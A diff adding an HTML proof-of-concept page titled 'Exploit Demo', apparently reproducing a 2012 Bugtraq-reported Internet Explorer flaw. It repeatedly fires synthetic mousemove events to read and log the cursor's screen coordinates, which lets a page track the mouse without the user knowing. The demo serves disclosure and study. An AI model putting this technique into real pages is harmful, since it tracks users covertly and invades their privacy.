@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Exploit Demo</title>
+  <script type="text/javascript">
+    // Referencia http://seclists.org/bugtraq/2012/Dec/81
+    window.attachEvent("onload", function() {
+      var detector = document.getElementById("detector");
+      detector.attachEvent("onmousemove", function (e) {
+        detector.innerHTML = e.screenX + ", " + e.screenY;
+        console.log(detector.innerHTML);
+      });
+      setInterval(function () {
+        detector.fireEvent("onmousemove");
+      }, 100);
+    });
+  </script>
+</head>
+<body>
+  <div id="detector"></div>
+</body>
+</html>
